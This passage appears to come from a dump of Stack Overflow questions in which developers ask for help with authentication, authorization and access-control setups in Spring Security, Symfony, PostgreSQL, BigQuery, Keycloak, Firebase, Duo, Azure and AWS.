</blockquote>
<p>All of AWS's documentation points to using Cloudfront to protect specifically against slowloris. Say I have a web app hosted in EKS behind an ALB, do I really need Cloudfront to do this? Even the documentation for AWS WAF and Shield mostly just mention using Cloudfront for this.</p>
<p>Specifically though, Cloudfront doesn't have FedRAMP authorization beyond Moderate, so I'm wondering if I really have to go get another product (another CDN or LB) in such an environment, or if AWS WAF/Shield on an ALB is enough.</p>
<p>Edit: It's worth mentioning I can also protect specifically against slowloris by using NGINX (Ingress which makes an NLB), but then I'm unable to use WAF.</p>
"
"<p><strong>Disclaimer - total Java Newbie</strong></p>
<p>Trying to Make a connection to an API for a Server Provisioning Framework (Katello - which is Open Source Red Hat Satellite) from a Java Application which will reside in an Apache OFBiz Framework to be used to calculate billing based on system usage etc.</p>
<p>The API requires you to provide credentials. I have toyed around with HTTPBuilder but quite frankly do not have enough experience writing in Java to accomplish this, and have yet to find anything consistent out there in google searches to help me accomplish this.</p>
<p>The Goal is to Make an API call to Foreman and Collect data about an entity and then feed that data into a database in OFBiz that I can use to calculate billing.</p>
<p>OFBiz Stable is currently running on Java 8
OFBiz Trunk is on Java 11</p>
<p>There is also the ability to leverage Groovy Scripts in OFBiz - Perhaps this may be the path of least resistance?</p>
<p>Any help with either of these will be helpful!</p>
<p>I have attempted to use HTTP Builder,</p>
<p>But so far I have been unsuccessful in using this with the need to authenticate.</p>
<p>Information on Katello API Authentication</p>
<p><a href=""https://access.redhat.com/documentation/en-us/red_hat_satellite/6.4/html/api_guide/chap-red_hat_satellite-api_guide-authenticating_api_calls"" rel=""nofollow noreferrer"">https://access.redhat.com/documentation/en-us/red_hat_satellite/6.4/html/api_guide/chap-red_hat_satellite-api_guide-authenticating_api_calls</a></p>
<p>Information on OFbiz</p>
<p><a href=""https://ofbiz.apache.org/"" rel=""nofollow noreferrer"">https://ofbiz.apache.org/</a></p>
"
"<p>I have a problem with Spring Security. When I'm trying to authenticate an user on my application, I'm redirected back to signin.html. After debugging, I saw that even if I'm instantiating SecurityContextHolder.getContext().setAuthentication(); , SecurityContext is null.</p>
<p>This is my authentication code:</p>
<pre><code>public boolean dbAuthentication(String username, String password) {
            Boolean response = false;
            try {
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                response = passwordEncoder.matches(password, userDetails.getPassword());
                if(response) {
                    UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(userDetails, password, userDetails.getAuthorities());
                    if (usernamePasswordAuthenticationToken.isAuthenticated()) {
                        SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);
                    }
                }
            } catch(Exception e) {
                response = false;
            }
            return response;
        }

</code></pre>
<p>This is my WebSecurityConfig class:</p>
<pre><code>   public class WebSecurityConfig {

    @Autowired
    private AppConfig appConfig;

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public WebSecurityCustomizer webSecurityCustomizer() throws Exception{
        return (web) -&gt; web.ignoring().requestMatchers( &quot;/build/**&quot;,&quot;/ext/**&quot;,&quot;/resources/**&quot;,&quot;../../../resources/**&quot;,&quot;/../../resources/**&quot;,&quot;../resources/**&quot;);
    }


    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
            http.
                    csrf(AbstractHttpConfigurer::disable).
                    headers(headers -&gt; headers.frameOptions(HeadersConfigurer.FrameOptionsConfig::sameOrigin))
                    .authorizeHttpRequests(a -&gt; a
                            .requestMatchers(&quot;/app/**&quot;).permitAll()
                            .requestMatchers(&quot;/signin.html&quot;).permitAll()
                            .requestMatchers(&quot;/forgot.html&quot;).permitAll()
                            .requestMatchers(&quot;/getCustomCss/**&quot;).permitAll()
                            .requestMatchers(&quot;/oauth2sso/**&quot;).permitAll()
                            .requestMatchers(&quot;/isLdapEnabled/**&quot;).permitAll()
                            .requestMatchers(&quot;/isSamlEnabled/**&quot;).permitAll()
                            .requestMatchers(&quot;/prefetchFiles*&quot;).permitAll()
                            .requestMatchers(&quot;/languages/getLanguages*&quot;).permitAll()
                            .requestMatchers(&quot;/getSessionTimeout&quot;).permitAll()
                            .requestMatchers(&quot;/wakeUpElastic/**&quot;).permitAll()
                            .requestMatchers(&quot;/forgotPassword*&quot;).permitAll()
                            .requestMatchers(&quot;/recoverPassword*&quot;).permitAll()
                            .requestMatchers(&quot;/authenticate*&quot;).permitAll()
                            .requestMatchers(&quot;/build/**&quot;).permitAll()
                            .requestMatchers(&quot;/ext/**&quot;).permitAll()
                            .requestMatchers(&quot;/resources/**&quot;).permitAll()
                            .requestMatchers(&quot;/logout*&quot;).permitAll()
                            .anyRequest().authenticated()
                    ).formLogin(formLogin -&gt; formLogin.loginPage(&quot;/signin.html&quot;).
                            usernameParameter(&quot;username&quot;)
                            .passwordParameter(&quot;password&quot;)
                            .defaultSuccessUrl(&quot;/index.html&quot;, true)
                            .failureUrl(&quot;/signin.html?error=true&quot;))
                    .logout(l -&gt; l
                            .invalidateHttpSession(true)
                            .deleteCookies(&quot;SESSIONID&quot;)
                            .logoutUrl(&quot;/signin.html?logout&quot;));
        return http.build();
    }
}
</code></pre>
<p>This problem occurs when I'm trying to update the SpringSecurity version to latest one and I tried to follow every instruction from official documentation, but without success.</p>
"
"<p>I want to enforce Row-Level Security (RLS) for PostgreSQL with <a href=""https://www.postgresql.org/docs/current/ddl-rowsecurity.html"" rel=""nofollow noreferrer"">Row Security Policies</a> for ALL users including admins and table owners:</p>
<pre class=""lang-sql prettyprint-override""><code>ALTER ROLE postgres WITH NOBYPASSRLS; -- enforce for the superuser
ALTER TABLE items ENABLE ROW LEVEL SECURITY;
ALTER TABLE items FORCE ROW LEVEL SECURITY; -- enforce RLS for table owners

CREATE POLICY never_anything_policy ON items
FOR ALL -- cannot do anything
USING (false); -- never true
</code></pre>
<p>Still I can query ALL items as user postgres</p>
"
"<p>i am facing issue with implementation of basic authentication spring security for spring boot 3 in java 17
i am having x-auth token as old and now i was also implementing this basic auth but unfortunately basic auth is calling authenticate method of x-auth-token which creates prob and gives me class casting error if we comment out or remove x-auth token implementation then basic auth works charm but yet my target is to implement multiple security basic auth with xauth independently</p>
<p>i tried combining them in 1 file using an inner class and also providing Order annotation which will make preference to basic auth
also i tried them in 2 different files but still basic auth .authenticated calls authenticate method of xauth token please help me out oif any solution provided
code</p>
<pre><code>Only basic auth

@Configuration
@EnableMethodSecurity
public class SecurityConfig {
    // User Creation
    // Configuring HttpSecurity
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
         http.csrf().disable()
            .authorizeRequests()
            .requestMatchers(new AntPathRequestMatcher(&quot;/index&quot;)).permitAll()
            .requestMatchers(&quot;/api/**&quot;).authenticated()
            .and().httpBasic();
         return http.build();
    }
    @Bean
    public UserDetailsService userDetailsService(PasswordEncoder encoder) {
        // InMemoryUserDetailsManager
        UserDetails user = User.withUsername(&quot;123&quot;)
            .password(encoder.encode(&quot;123&quot;))
            .roles(&quot;USER&quot;)
            .build();
        return new InMemoryUserDetailsManager(user);
    }
    // Password Encoding
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}

combining basic auth + x auth

    @Configuration
    @Order(1)
    public class BasicAuthSecurityConfig {
        @Bean
        public SecurityFilterChain basicAuthFilterChain(HttpSecurity http) throws Exception {
            http.csrf().disable()
                .authorizeRequests()
                .requestMatchers(new AntPathRequestMatcher(&quot;/index&quot;))
                .permitAll()
                .requestMatchers(new AntPathRequestMatcher(&quot;/api/user/**&quot;)).authenticated()
                .and().httpBasic();
            return http.build();
        }
    }
    @Configuration
    @Order(2)
    public class XAuthSecurityConfig {
        @Bean
        public SecurityFilterChain xAuthFilterChain(HttpSecurity http) throws Exception {
            http.csrf().disable()
                .authorizeRequests()
                .requestMatchers(new AntPathRequestMatcher(&quot;/index&quot;)).permitAll()
                .requestMatchers(new AntPathRequestMatcher(&quot;/api/give/&quot;)).authenticated()
                .and()
                .addFilterBefore(AuthenticationFilter(), BasicAuthenticationFilter.class)
                .addFilterBefore(webSecurityCorsFilter(), ChannelProcessingFilter.class)
                .exceptionHandling().authenticationEntryPoint(AuthenticationEntryPoint())
                .and().requestCache().requestCache(httpSessionRequestCache())
                .and().anonymous().disable()
                .headers().frameOptions().disable();
            return http.build();
        }
    }

</code></pre>
<p>in both cases basic authentication is calling authenticate method of xauth-token which should be the case if i remove or comment out code of xauthtoken basic auth works please provide me some info that how can i combine both and not interacting with each other
also as spring boot 3 and java 17 what the latest syntax used for it and correct my above code if anything not correct</p>
<p>thanks</p>
"
"<p>I inherited a report that calculates commission totals for sales reps.  After updating the calculations within the measures to this year’s goals we went to test the row level security to find the results of the measures don’t appear for the sales group.  The management group can see everything just fine.   The security works fine with each rep only able to see their name, but the results from the measures are not visible in the matrix that’s bult for them.   Also, other measures on the matrix work just fine.  Just the ones updates were made to are not working.</p>
<p>Any suggestions on what could cause this and how to troubleshoot?</p>
<p>We’ve double checked the security, and nothing is showing to be filtered that shouldn’t be.<br />
Tried building the same visual on a different page.
Tried to rebuild the measures again from scratch (the measures work just fine, until we test the row level security for this group)</p>
"
"<p>i have two roles in my application one is admin and the other is the mother each role have a different interface i first tried to make the both roles sign in by the same route and same interface and the code works perfectly for both but now that i want to add another route and seperate the users login interfaces  i don't know how to do it any help ?</p>
<pre><code>
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Http\Authentication\AuthenticationUtils;
use Symfony\Component\Security\Core\Security;
class AuthController extends AbstractController
{
    #[Route('/', name: 'admin_login')]
    public function loginAdmin(AuthenticationUtils $authenticationUtils,Security $security): Response
    {
        $user = $security-&gt;getUser();
        if ($user) {
            // Check the role of the user
            if (in_array('ROLE_MOTHER', $user-&gt;getRoles())) {
                // If the user is a mother, redirect to another route
                return $this-&gt;redirectToRoute('app_testTemplate');
            }
           else{
            return $this-&gt;redirectToRoute('get_users');
           }
        }
        // Get the login error if there is one
        $error = $authenticationUtils-&gt;getLastAuthenticationError();
        // Last username entered by the user
        $lastUsername = $authenticationUtils-&gt;getLastUsername();
        return $this-&gt;render('security/admin_login.html.twig', [
            'last_username' =&gt; $lastUsername,
            'error' =&gt; $error,
        ]);
    }
    #[Route('/logout', name: 'app_logout')]
    public function logout(): void
    {
        
    }
}
  ``` this is my controller for handling login and this is my security.yaml file ```                                
security:
    enable_authenticator_manager: true
    # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    # https://symfony.com/doc/current/security.html#loading-the-user-the-user-provider
    providers:
        # used to reload user from session &amp; other features (e.g. switch_user)
        app_user_provider:
            entity:
                class: App\Entity\User
                property: email
        # used to reload user from session &amp; other features (e.g. switch_user)
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            provider: app_user_provider
            form_login:
                login_path: admin_login
                check_path : admin_login
                enable_csrf: true
            logout:
                path: app_logout
                # where to redirect after logout
                target: admin_login
                # where to redirect after logout
                # target: app_any_route
            remember_me:
                secret: '%kernel.secret%'
                lifetime: 604800
                path: /
                always_remember_me: true
                # where to redirect after logout
                # target: app_any_route

            # activate different ways to authenticate
            # https://symfony.com/doc/current/security.html#the-firewall

            # https://symfony.com/doc/current/security/impersonating_user.html
            # switch_user: true

    # Easy way to control access for large sections of your site
    # Note: Only the *first* access control that matches will be used
    access_control:
        #  - { path: ^/admin, roles: ROLE_ADMIN }
        #  - { path: ^/user, roles: ROLE_MOTHER}

when@test:
    security:
        password_hashers:
            # By default, password hashers are resource intensive and take time. This is
            # important to generate secure password hashes. In tests however, secure hashes
            # are not important, waste resources and increase test times. The following
            # reduces the work factor to the lowest possible values.
            Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface:
                algorithm: auto
                cost: 4 # Lowest possible value for bcrypt
                time_cost: 3 # Lowest possible value for argon
                memory_cost: 10 # Lowest possible value for argon
</code></pre>
"
"<p>I am trying to create row level security policy in Bigqeuery</p>
<pre><code>CREATE OR REPLACE ROW ACCESS POLICY policy_name
ON `sample_project.sample_dataset.sample_table`
GRANT TO ('allAuthenticatedUsers')
FILTER USING (sample_column = 'abc');
</code></pre>
<p>Whenever I try to query the table, it will always return the data which matches with column value <code>abc</code>
But I need to create RLS policy so that it accepts a variable in <code>FILTER USING</code> and before executing any query, I will set that variable to any value.</p>
<p>I have used below query to create RLS</p>
<pre><code>DECLARE variable STRING DEFAULT 'abc';
CREATE OR REPLACE ROW ACCESS POLICY policy_name
ON `sample_project.sample_dataset.sample_table`
GRANT TO ('allAuthenticatedUsers')
FILTER USING (sample_column = FORMAT('%t', variable));
</code></pre>
<p>But I got the below error while creating the policy
<code>Parameters and variables in FILTER USING expression are not supported</code></p>
<p>Can someone please help me with this?</p>
"
"<p>I am using Sulu CMF and have a custom controller for the sales process on a website. Only logged-in users with a specific security context may access the pages served by the controller, so the controller implements the <code>SecuredControllerInterface</code>.</p>
<pre><code>class SaleController extends AbstractController implements SecuredControllerInterface
{
  /* ... */

  public function getSecurityContext() { 
    return 'private_sale.sale.purchase';
  }

  /* ... */
}
</code></pre>
<p>When a logged in user browses a page managed by this controller, and if the user does not have the respective permissions, the server responds with a 403 page.</p>
<p>Is there a way that the user gets redirected to another page, instead of returning 403?</p>
"
"<p>I have a Symfony 7 project where I'm implementing custom authentication logic for the login route (/api/login). I have a login method in my controller that handles user login and generates a token based on the provided name. Additionally, I've created a custom AuthenticationListener class that implements AuthenticatorInterface to handle authentication for other routes.</p>
<p>Here's a summary of the relevant code:</p>
<pre><code>&lt;?php

namespace App\EventListener;

use Symfony\Component\EventDispatcher\Attribute\AsEventListener;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Event\RequestEvent;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;



class AuthenticationListener implements AuthenticatorInterface
{

    public function supports(Request $request): ?bool
    {
        $route = $request-&gt;attributes-&gt;get('_route');
        return str_starts_with($route, 'api_');
    }

    #[AsEventListener(event: 'kernel.request')]
    public function authenticate(RequestEvent|Request $event): Passport
    {
        $request = $event-&gt;getRequest();

        // Check if the request is for the login route
        if ($request-&gt;attributes-&gt;get('_route') === 'login') {

            return new Passport();
        }


        if (!$request-&gt;headers-&gt;has('Authorization')) {
            throw new UnauthorizedHttpException('Unauthorized', 'Authorization header is missing');
        }

        $key = $request-&gt;headers-&gt;get('Authorization');

        if (!$key) {
            throw new UnauthorizedHttpException('Unauthorized', 'Authorization header is missing');
        }

        $decryptedName = $this-&gt;decrypt($key);

        if (!$decryptedName) {
            throw new UnauthorizedHttpException('Unauthorized', 'Invalid or expired token');
        }

        // Create a UserBadge for other routes
        $userBadge = new UserBadge($decryptedName, function ($username) {
            return null;
        });

        return new Passport($userBadge);
    }


    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }


    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    private function decrypt($string): string
    {
        // Decrypt the authorization token using your decryption method
        $secret_key = $_ENV['APP_SECRET']; // Ensure you have APP_KEY set in your environment variables
        $key = openssl_digest($secret_key, 'SHA256', TRUE);
        $c = base64_decode($string);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($c, $ivlen + $sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        //        dd($original_plaintext);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return $original_plaintext;
        }
        return ''; // Return an empty string if decryption fails
    }


    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}

</code></pre>
<pre><code>class UserController extends AbstractController
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }


    #[Route('/api/login', name: 'login', methods: ['POST'])]
    public function login(Request $request): JsonResponse
    {
        // Retrieve the request data
        $requestData = json_decode($request-&gt;getContent(), true);

        // Ensure the required fields are provided
        if (!isset($requestData['name'])) {
            return new JsonResponse(['error' =&gt; 'Name field is required'], Response::HTTP_BAD_REQUEST);
        }

        $name = $requestData['name'];

        // Encrypt the name
        $encryptedName = $this-&gt;encrypt($name);

        // Generate a token based on the encrypted name
        $token = $this-&gt;generateToken($encryptedName);

        // Return the token to the client
        return new JsonResponse(['token' =&gt; $token]);
    }

    private function encrypt(string $name): string
    {
        $secretKey = $_ENV['APP_SECRET'];
        $key = openssl_digest($secretKey, 'SHA256', TRUE);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertextRaw = openssl_encrypt($name, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertextRaw, $key, true);
        $output = base64_encode($iv . $hmac . $ciphertextRaw);

        return $output;
    }

    private function generateToken(string $encryptedName): string
    {
        // Generate a token based on the encrypted name
        return hash('sha256', $encryptedName);
    }
</code></pre>
<p>Despite my efforts, I'm encountering challenges bypassing authentication for the login route and ensuring proper authentication for other routes. I've experimented with different configurations, but I keep receiving errors related to missing or invalid authorization headers.</p>
<p>Could someone provide guidance on how to correctly implement custom authentication logic for the login route while ensuring authentication for other routes remains intact? Any insights, code examples, or configuration suggestions would be greatly appreciated. Thank you!</p>
<pre><code>security:
password_hashers:
    Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
firewalls:
    dev:
        pattern: ^/(_(profiler|wdt)|css|images|js)/
        security: false
    main:
        lazy: true
        stateless: true
        custom_authenticators:
            - App\EventListener\AuthenticationListener
    api_login:
        pattern: ^/api/login
        stateless: true

access_control:
    - { path: '^/api/login', roles: PUBLIC_ACCESS }
    - { path: '^/', roles: IS_AUTHENTICATED_FULLY }
</code></pre>
<p><strong>update</strong>
I have updated the security.yml and customauthenticator.php but I receive this error &quot;   &quot;title&quot;: &quot;An error occurred&quot;,
&quot;status&quot;: 401,
&quot;detail&quot;: &quot;Full authentication is required to access this resource.&quot;,
&quot;class&quot;: &quot;Symfony\Component\HttpKernel\Exception\HttpException&quot;,:</p>
<pre><code>security:
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            stateless: true
            custom_authenticators:
                - App\Security\CustomAuthenticator
        api_login:
            pattern: ^/api/login
            stateless: false # Change stateless to false for stateful authentication

    access_control:
        - { path: '^/api/login', roles: PUBLIC_ACCESS }
        - { path: '^/', roles: [ROLE_USER, ROLE_COMPANY_ADMIN, ROLE_SUPER_ADMIN] }
</code></pre>
<pre><code>&lt;?php

namespace App\Security;

use Doctrine\ORM\EntityManagerInterface;
use Exception;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\User\UserInterface;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

use App\Entity\User; // Assuming your User entity is in the App\Entity namespace

class CustomAuthenticator implements AuthenticatorInterface
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }

    public function supports(Request $request): ?bool
    {
        return $request-&gt;isMethod(Request::METHOD_POST)
            &amp;&amp; $request-&gt;getRequestUri() === '/api/login';
    }

    public function authenticate(Request $request): Passport
    {
        $requestData = json_decode($request-&gt;getContent(), true);
        if (!isset($requestData['name'])) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Required field &quot;name&quot; is missing');
        }

        $name = $requestData['name'];

        try {
            $decryptedName = $this-&gt;decrypt($name);
        } catch (Exception $e) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Invalid or tampered token');
        }

        $user = $this-&gt;loadUser($decryptedName);

        $userBadge = new UserBadge($decryptedName, function ($name) {
            return $this-&gt;loadUser($name);
        });

        return new Passport($userBadge);
    }

    private function loadUser(string $name): ?UserInterface
    {
        return $this-&gt;entityManager-&gt;getRepository(User::class)-&gt;findOneBy(['name' =&gt; $name]);
    }

    private function decrypt($string): string
    {
        // Decrypt the authorization token using your decryption method
        $secret_key = $_ENV['APP_SECRET']; // Ensure you have APP_KEY set in your environment variables
        $key = openssl_digest($secret_key, 'SHA256', TRUE);
        $c = base64_decode($string);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($c, $ivlen + $sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        //        dd($original_plaintext);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return $original_plaintext;
        }
        return ''; // Return an empty string if decryption fails
    }


    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }

    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}
</code></pre>
"
"<p>We want to create a custom authenticator to restrict the IP addresses such that particular applications coming with specific IP addresses can get the access token based on the provided client ID and client secret. If some other application with no restricted IP addresses tries to access, they should not be issued an access token. At present, we have created a custom authenticator by implementing keycloak authenticating interface and we have copied that custom authenticated jar file to the provider folder to the keycloak while starting keycloak this custom authenticator loads without issue. After logging into keycloak when we click on the clients flow in the authentication section we cannot see this custom authenticator whereas when we create a new flow as a basic flow we can see this basic flow of custom authenticator how can we see this custom authenticator in clients flow so that we can use it with the combination of client id and client secret flow step.</p>
"
"<p>I have an API that has multiple roles, and I want to hide some endpoints for specific roles in docs and also in the /api entrypoint. Is there an easy way to do so?</p>
<p>I found this question</p>
<p><a href=""https://stackoverflow.com/questions/54111661/how-to-hide-a-route-from-api-platform-documentation"">How to hide a route from API Platform documentation</a></p>
<p>But it hides the endpoint entirely.</p>
"
"<p>DRM services, data rooms and document storage services market themselves with the ability to &quot;remote shred&quot; or &quot;remote wipe&quot; a file or access to a file after it has been downloaded to a local machine, without the use of additional local software.</p>
<p>Adobe DRM has content management services, but looks to require software on the local machine.</p>
<p>You could set expiration date on a PDF, but what are some ways you could set a PDF or say an excel spreadsheet to be inaccessible or corrupted at any point in the future. Accept that the file could be cloned and that the local machine disconnected from the internet.</p>
<p>Have set expiration dates on a PDF and added password protect, but the expiration date must be arbitrary at download, as opposed to being able to revoke access at a certain point.</p>
<p>What's the best strategy for protecting a file from future access if it is allowed to be downloaded? Really interested in this type of technology. Thanks in advance.</p>
"
"<p><strong>I am building an app where security is really important.</strong>
For the user authentication, I currently use the basic email/password auth with Firebase.
Firebase is as well used as my database.</p>
<p><strong>I would like to enhance the security of my authentication flow, adding a deviceID factor in addition to the email/password factors.</strong></p>
<p>Here is the flow idea:</p>
<ul>
<li>I generate a deviceID (store in secure storage) when a user create an account for its current device.</li>
<li>When the user will login later, it will check if its current deviceID (if existing in secure storage) is saved as a trusted device in the database</li>
<li>If not trusted, an OTP challenge will be triggered. If succeed, the current device will be added to the list of trusted devices</li>
</ul>
<p>Some people does that locally, but it is not secure (Firebase auth API is still available with only email/password in bypassing the app UI).</p>
<p>**I am looking for a solution to integrate the deviceID factor to an authentication flow.
**</p>
<p>Research I have done:</p>
<ul>
<li>Firebase blocking functions: unfortunately we cannot pass custom parameter, and the native values of the event parameters (IP address, userAgent...) are not enough robust/secure</li>
<li>Firebase cloud functions: not directly correlated to the authentication flow, so the Firebase auth API will remain available with only email/password in bypassing the app UI)</li>
<li>Supabase: does not propose custom authentication, and the serverless function got the same issue as the Firebase cloud functions</li>
<li>Local custom actions: same issue as cloud functions</li>
</ul>
<p><strong>Promising trails:</strong></p>
<p>The Firebase custom Token allow to connect a user and use the Firebase services, which is great given the Firebase integration is nice on Flutter.</p>
<p>It involves either:</p>
<ul>
<li>to create my own auth backend, which could cause security flaws (given I am not an expert) and as well adding more code to manage</li>
<li>or to use an external auth provider (Clerk, Auth0, Amazon Cognito...)</li>
</ul>
<p><strong>Has someone already solve this can of issue for its app ?
Has some already integrated Clerk, Auth0 or Cognito as custom authentication provider in its FlutterFlow app?</strong></p>
<p>Thanks in advance for replies</p>
"
"<p>I cannot retrieve the secret key from the Duo Admin API.</p>
<p>I have created a Duo Admin API with the following authorizations.</p>
<ul>
<li>Grant Applications</li>
<li>Grant Read Log</li>
<li>Grant Read Resource</li>
</ul>
<p>When looking at the Duo Admin API github ( (<a href=""https://github.com/duosecurity/duo_client_python/blob/master/duo_client/admin.py"" rel=""nofollow noreferrer"">https://github.com/duosecurity/duo_client_python/blob/master/duo_client/admin.py</a>)
), I don't see a specific api call for &quot;Retrieve Secret&quot; as it seems like there would be based on the documentation found here:
<a href=""https://duo.com/docs/adminapi#retrieve-secret-key"" rel=""nofollow noreferrer"">https://duo.com/docs/adminapi#retrieve-secret-key</a></p>
<p>If I perform the &quot;get_integration&quot; call, I am able to get the secret key, however it is only partially visible (i.e. xxxxxxxxxxxxxxxxx3432jas).</p>
<p>The documentation states that the python client supports this, but I don't see that functionality. Additionally, the documentation states that the authentication requests for this endpoint are signed differently than as stated in the docs...so we cannot generate the requests ourselves...</p>
<p>Does anyone know how to get the fully visible secret key via the admin api?</p>
"
"<p>According to the documentation of Static Web App (SWA), you can create an Azure Function that will allow to assign an authenticated User custom roles, usually called GetRoles: <a href=""https://learn.microsoft.com/en-us/azure/static-web-apps/authentication-custom?tabs=aad%2Cfunction"" rel=""nofollow noreferrer"">SWA custom auth</a>.
The problem is that I am not able to get this functionality to work - even though I added the function it does not get triggered and I can not assign custom roles to the User.</p>
<p>I have used SWA cli to debug locally with the provided authentication emulator, but when I get logged in, it does not trigger the GetRoles function, so I can not debug code that I am suppose to write. I have run the function in a separate terminal (to be able to attach in vsc) and started the SWA with: <code>swa start ./my-dist --api-devserver-url http://localhost:7071</code>.</p>
<p>I have also tried to deploy to Azure to see, if maybe there it will call GetRoles automatically, but that also did not work (Roles were still authenticated and anonymous).Here additional question appeared - how to see logs from the provided api function that was included in the SWA? It would have to be an dedicated Azure Function that was deployed separately (bring your own custom function)?</p>
<p>I have followed this example provided on GH: <a href=""https://github.com/staticwebdev/roles-function"" rel=""nofollow noreferrer"">https://github.com/staticwebdev/roles-function</a>, and just changed the function to return an array of some custom roles: [&quot;admin&quot;, &quot;reader&quot;], so I have expected that now, after login, the roles would be: admin, reader, but it remains: authenticated, anonymous.
What am I doing wrong here?</p>
"
"<p>I have an Angular website with a NodeJS server backend. The user gets redirected to a DUO authentication screen when I log in. I use the <code>@duosecurity/duo_universal</code> package for this. The user can authenticate on this screen and be redirected to the website. The issue is that the Authentication headers are all gone, and the user can no longer access the website.</p>
<p>When a user logs in, a JWT token is generated and used to authenticate the user. This token is updated when the account is verified.</p>
<p>The DUO authentication takes a return and returns the user to this page when the authentication is successful. After returning to the website, I get the following error when I try to access the NodeJS server from Angular:</p>
<p><code>403 Forbidden</code></p>
<p>In NodeJS:</p>
<p><code>ERROR: Bearer realm=&quot;Users&quot;</code></p>
<p>Before redirection, this function worked. This is caused by the Authorization header being present in the headers. After the redirect, it's gone. I tried adding it again after the redirect using the same JWT token, but this had no effect on the header (accessToken is the working JWT token with the correct format: &quot;Bearer &lt;code here&gt;&quot;):</p>
<pre><code>const httpOptions = {
  headers: new HttpHeaders({
    /*'Content-Type':  'application/json'*/
  })
};
httpOptions.headers = httpOptions.headers.set('Authorization', accessToken);
return this.http.get(`/api/auth/duo/redirect`, {observe: 'response', headers: httpOptions.headers });
</code></pre>
<p>This reaches the NodeJS server but immediately gets caught by code, which checks if an Authorization header is present, which isn't. I postman everything works since I can input the Authorization header with the correct JWT token.</p>
<p>Please let me know if you need more info. I'm currently stuck on this, and I need this to work. What can I do to retain my Authorization header after a redirect?</p>
"
"<p>I find myself facing a CSP authorization problem for YouTube:</p>
<pre><code>Refused to connect to 'https://youtube.com/oembed?url=http://youtube.com/watch?v=3Bs4LOtIuxg' because it violates the following Content Security Policy directive: &quot;default-src 'self' 'unsafe-inline'&quot;. Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.
</code></pre>
